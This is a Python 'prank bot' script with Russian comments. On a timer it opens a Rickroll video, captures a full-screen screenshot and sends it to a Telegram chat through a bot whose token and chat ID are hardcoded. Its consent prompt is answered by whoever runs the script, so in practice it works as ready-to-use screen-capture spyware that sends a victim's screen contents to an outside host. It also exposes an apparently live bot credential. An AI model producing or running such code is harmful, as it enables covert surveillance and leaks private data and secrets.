# RickrollPrankBot.py
# ЧЕСТНАЯ ВЕРСИЯ — без автозагрузки, процесс виден в диспетчере
# pip install pyautogui python-telegram-bot keyboard

import threading
import time
import webbrowser
import pyautogui
import io
import sys
from telegram import Bot

# ===== НАСТРОЙКИ (измени под себя) =====
BOT_TOKEN = "8684405661:AAGEa89yVc1u5_1dWFAWXEWwCa0Uc3uTh7w"   # Замени на свой
CHAT_ID = "7958317953"  # Замени на свой ID
# ========================================

bot = Bot(token=BOT_TOKEN)

def send_screenshot_and_notify():
    """Делает скриншот и отправляет в Telegram"""
    try:
        screenshot = pyautogui.screenshot()
        img_bytes = io.BytesIO()
        screenshot.save(img_bytes, format="PNG")
        img_bytes.seek(0)
        bot.send_photo(chat_id=CHAT_ID, photo=img_bytes, caption="😂 Рикролл активирован! Скриншот экрана:")
    except Exception as e:
        print(f"[Ошибка отправки] {e}")

def rickroll_action():
    """Открывает видео и отправляет скриншот"""
    print("🚀 Открываю Rickroll...")
    webbrowser.open("https://youtu.be/dQw4w9WgXcQ")
    send_screenshot_and_notify()
    print("📸 Скриншот отправлен в Telegram")

def schedule_rickroll(interval_minutes=30):
    """Запускает рикролл каждые N минут"""
    print(f"⏰ Бот запущен! Рикролл будет каждые {interval_minutes} минут")
    print(f"📸 Скриншоты будут уходить в Telegram")
    print(f"🛑 Чтобы остановить — закрой окно или убей процесс в Диспетчере задач\n")
    
    # Первый запуск через 5 секунд (чтобы дать время передумать)
    time.sleep(5)
    
    while True:
        rickroll_action()
        print(f"💤 Следующий через {interval_minutes} минут...")
        time.sleep(interval_minutes * 60)

if __name__ == "__main__":
    print("="*50)
    print("🎭 PRANK BOT — Rickroll с отправкой скриншотов")
    print("="*50)
    print("⚠️  ВНИМАНИЕ:")
    print("   • Процесс ВИДЕН в диспетчере задач")
    print("   • НЕТ автозагрузки в реестре")
    print("   • Остановить — через Диспетчер задач (Завершить процесс Python)")
    print("   • Используй ТОЛЬКО с согласия друга!\n")
    
    confirm = input("Твой друг согласился на пранк? (да/нет): ").lower()
    if confirm != "да":
        print("❌ Отмена. Шутить без согласия — не круто.")
        sys.exit(0)
    
    try:
        # Запускаем рикролл каждые 30 минут (можно поменять)
        schedule_rickroll(interval_minutes=30)
    except KeyboardInterrupt:
        print("\n🛑 Программа остановлена.")
    except Exception as e:
        print(f"Ошибка: {e}")